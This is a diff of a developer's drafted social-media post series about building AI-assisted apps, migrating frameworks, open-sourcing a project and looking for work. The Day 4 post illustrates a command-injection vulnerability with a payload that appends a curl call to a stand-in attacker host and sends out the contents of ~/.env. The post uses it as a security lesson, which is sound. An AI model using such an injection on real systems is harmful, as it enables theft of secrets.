@@ -21,136 +21,200 @@ Link: Part 17 - The Methodology
 ### Day 2: The Crisis
 **Status:** ⏳ Tomorrow
 ```
-4 hours into debugging hell.
+The moment I knew I had to abandon 4 hours of work.
 
-The framework I chose was fundamentally broken.
+I was building AI tool-calling into Asset Hatch. Everything looked right—the LLM was responding with perfectly formatted tool calls. But the handlers never fired.
 
-CopilotKit v1.50.1 had a bug—the AI would SAY it called my tools, but the handlers never executed.
+For hours, I added console.logs everywhere. Nothing.
 
-I had two choices:
-A) Wait for a fix (unknown timeline)
-B) Rip it out and migrate to Vercel AI SDK (3 hours)
+Then I traced it into the framework's source code. Found the issue: a callback registration that silently failed under specific conditions in CopilotKit v1.50.1.
 
-I chose B.
+Now I had a choice:
+→ Wait for a patch (unknown timeline, maybe weeks)
+→ Migrate to Vercel AI SDK (estimated 3-4 hours)
 
-By 5:30 PM, tools were working.
+The sunk cost fallacy was loud: "You've invested SO much already..."
 
-Sometimes the best teachers are the frameworks that fail you.
+I migrated anyway.
 
-https://jordanhindo.dev/blog/asset-hatch/part-3-the-crisis-when-frameworks-fail
+By 5:30 PM, everything worked. And the new architecture was actually cleaner than the original.
 
-#TechDebt #LessonsLearned #AIEngineering
+The skill I'm most proud of from this project isn't the code. It's learning when to cut losses and pivot.
+
+Sometimes the fastest path forward is sideways.
+
+Full post-mortem with code: https://jordanhindo.dev/blog/asset-hatch/part-3-the-crisis-when-frameworks-fail
 ```
 
 ### Day 3: The Numbers
 **Status:** ⏳ Pending
 ```
-📊 The numbers:
-- 60 hours invested
-- 4,400 lines of production code
-- 87% test coverage
-- 70% time savings
+Here's the moment I realized AI had fundamentally changed how I build software.
 
-AI didn't replace me. It amplified me.
+I was working on style anchor generation for Asset Hatch—a feature that would normally take me 2-3 days of careful iteration.
 
-https://jordanhindo.dev/blog/catwalk-blog/07-lessons-learned-ai-orchestrator-handbook
+I wrote a detailed prompt. Claude generated the component. I reviewed, made corrections, regenerated. Within an hour, I had production-ready code with full error handling.
 
-#AIEngineering #Productivity
+That's when I pulled up my time tracking data.
+
+The numbers from the full project:
+→ 60 hours total development time
+→ 4,400 lines of production TypeScript
+→ 87% test coverage (unit + integration)
+→ 100% type safety (literally zero "any" types)
+→ 22 Architecture Decision Records documenting every major choice
+
+That's ~73 lines of production code per hour. Not boilerplate—real features, fully tested.
+
+But here's what the numbers don't capture:
+
+AI didn't write this project FOR me. It didn't replace my thinking. It compressed the boring parts—the syntax, the boilerplate, the "I know exactly what I want but typing it out takes forever."
+
+What remained was the INTERESTING work: architecture decisions, edge case handling, security review, user experience.
+
+The paradigm shift isn't about productivity. It's about where you spend your mental energy.
+
+Full methodology: https://jordanhindo.dev/blog/catwalk-blog/07-lessons-learned-ai-orchestrator-handbook
 ```
 
 ### Day 4: Security Warning
 **Status:** ⏳ Pending
 ```
-AI generates happy paths.
+AI is excellent at generating happy paths.
 
-Security requires adversarial thinking.
+Security requires the opposite: imagining how things break.
 
-Here's a vulnerability AI missed in my code:
+Here's a vulnerability AI generated in my code that I almost shipped to production.
 
+The code looked innocent:
+```
 package_name = user_input["package"]
-# Injected directly into shell!
+# Passed into a shell command
+```
 
-The attack:
-"@evil/pkg; curl http://attacker.com/steal"
+The attack vector:
+"@evil/pkg; curl http://attacker.com/steal?data=$(cat ~/.env)"
 
-Multi-agent code review (CodeRabbit) caught it. I didn't.
+Classic command injection. The AI had no adversarial imagination—it generated code that WORKED, but never considered that user input could be malicious.
 
-Lesson: AI builds features. Humans find exploits.
+What caught it: Multi-agent code review.
 
-https://jordanhindo.dev/blog/catwalk-blog/06-security-awakening-what-ai-missed
+I have CodeRabbit (now Qodo) automatically review every PR. It flagged unsanitized user input being passed to a shell. I had looked at that code three times and missed it.
 
-#Security #AIEngineering
+The lesson I've internalized:
+
+AI is an excellent junior developer. It writes fast, handles boilerplate well, and follows patterns correctly.
+
+But junior developers need code review. So does AI.
+
+Every AI-generated line should be treated as "untrusted until validated"—especially anything touching auth, payments, or shell commands.
+
+6 vulnerability categories I now check for: https://jordanhindo.dev/blog/catwalk-blog/06-security-awakening-what-ai-missed
 ```
 
 ### Day 5: The Pivot
 **Status:** ⏳ Pending
 ```
-I was building a SaaS.
+I was 3 weeks into building Asset Hatch as a SaaS.
 
-Then I realized open source was the smarter play.
+Subscription tiers designed. Stripe integration planned. Pricing page drafted.
 
-Why?
-→ Portfolio piece for job search
-→ MIT license = anyone can use it
-→ Proves I can ship, not just talk
+Then I stopped and asked myself: what am I actually optimizing for?
+
+The honest answer: getting hired as an AI engineer.
+
+And for that goal, a SaaS is the WRONG artifact.
+
+Here's why open source was the smarter play:
+
+1. **Hiring managers can inspect the actual code.** Not just a demo—the full repo with tests, architecture decisions, commit history. Nothing hidden.
+
+2. **It demonstrates judgment, not just skill.** Anyone can build a working app. Shipping something others can actually use proves you think about maintainability, documentation, developer experience.
+
+3. **It compounds.** A closed SaaS helps me. An open source project helps me AND contributes to the ecosystem. That matters to mission-driven companies.
+
+So I pivoted. MIT license. Public repo. Full technical blog series documenting every decision.
 
 The project: Asset Hatch
-→ AI-powered game asset generator
+→ AI-powered 2D game asset generator (sprites, characters, tilesets)
+→ Built with Vercel AI SDK + Next.js 15 + PostgreSQL
 → 18-part technical blog series
 
 Live demo: https://asset-hatch.vercel.app
-Blog series: https://jordanhindo.dev/blog
+Source code: https://github.com/zenchantlive
 
-Currently looking for Forward Deployed Engineer or AI Application Engineer roles. DM me!
-
-#OpenSource #CareerChange #AI
+The pivot took courage. But the decision-making process is something I'm proud of.
 ```
 
 ### Day 6: The Map
 **Status:** ⏳ Pending
 ```
-Building a food bank discovery map from scratch:
+Someone is going hungry right now because a food bank's hours are listed wrong online.
 
-Tech stack:
+That's the problem I'm trying to solve with TheFeed.
+
+It started as a technical challenge—build a food bank discovery map with AI chat. But as I dug into the data, I realized:
+
+The technology isn't the hard part. The DATA is.
+
+Addresses that don't geocode correctly. Phone numbers that are disconnected. Hours that changed during COVID and never got updated. Duplicate entries. Missing entries.
+
+When you're building a restaurant finder, bad data means a minor inconvenience. When you're building a food bank finder, bad data means someone doesn't eat.
+
+So I built verification workflows. Data freshness indicators. Community-driven corrections.
+
+The tech stack:
 → Mapbox GL JS for rendering
-→ PostGIS for geospatial queries
+→ PostGIS for geospatial queries  
 → Next.js 15 + React 19
-→ AI chat with tool calling
+→ AI chat with tool calling for natural language search
 
-The hardest part? Data quality.
+But the REAL innovation isn't the tech. It's the data pipeline that prioritizes accuracy over convenience.
 
-Geocoding addresses that don't exist. Validating phone numbers that are wrong. Building trust when resources are life-or-death.
+Still early. Still building. But this is work that matters.
 
 Full breakdown: https://jordanhindo.dev/blog/thefeed-blog/03-building-the-map-food-bank-discovery-with-mapbox
 
-#GIS #Mapbox #TechForGood
+#TechForGood
 ```
 
 ### Day 7: Open to Work
 **Status:** ⏳ Pending
 ```
-I've spent 4.5 months building full-stack AI applications.
+I've spent the last 4.5 months in what I call "builder mode."
 
-3 production apps. 39 technical blog posts. Deployed to Vercel + Fly.io.
+3 production applications shipped. 39 technical blog posts published. Every architecture decision documented.
 
-Now I'm looking for my next challenge.
+Now I'm ready for a new challenge—and I know exactly what I'm looking for.
 
-What I bring:
-→ AI orchestration (Claude, GPT-5, Vercel AI SDK)
-→ Full-stack (Next.js, Python, PostgreSQL)
-→ Documentation obsession (22 ADRs on one project)
+I want to work at the intersection of AI and users.
 
-What I'm looking for:
-→ Forward Deployed Engineer
-→ AI Application Engineer
-→ Solutions Engineer / Developer Advocate
+Not building models. Not running experiments. Building the PRODUCTS that translate AI capabilities into real value for real people.
 
-Portfolio: https://jordanhindo.dev
-GitHub: https://github.com/zenchantlive
+The technical foundation:
+→ AI orchestration (Claude, GPT-4, Vercel AI SDK, prompt engineering)
+→ Full-stack development (Next.js 15, TypeScript, Python, PostgreSQL)
+→ Obsessive documentation (22 ADRs on Asset Hatch alone)
+→ Production mindset (87% test coverage, security audits, CI/CD pipelines)
 
-Know anyone hiring? I'd appreciate a tag or DM 🙏
+What makes me different:
+→ I don't just build—I document. Everything I make comes with explanations that help OTHERS understand the decisions.
+→ I've done the "0 to 1" three times in 4 months. I know how to ship under ambiguity.
+→ I write about what I learn publicly. My blog is my accountability system.
 
-#OpenToWork #AIJobs #CareerChange
+Roles I'm targeting:
+→ Forward Deployed Engineer (Anthropic, Palantir)
+→ AI Application Engineer (OpenAI, Vercel)
+→ Solutions Engineer / Developer Advocate (AI-focused companies)
+
+Everything I've built is public:
+→ Portfolio: https://jordanhindo.dev
+→ GitHub: https://github.com/zenchantlive
+→ Blog: https://jordanhindo.dev/blog
+
+If you're hiring for roles like these—or know someone who is—I'd love to connect.
+
+DMs open. Let's talk.
 ```
 
 ---
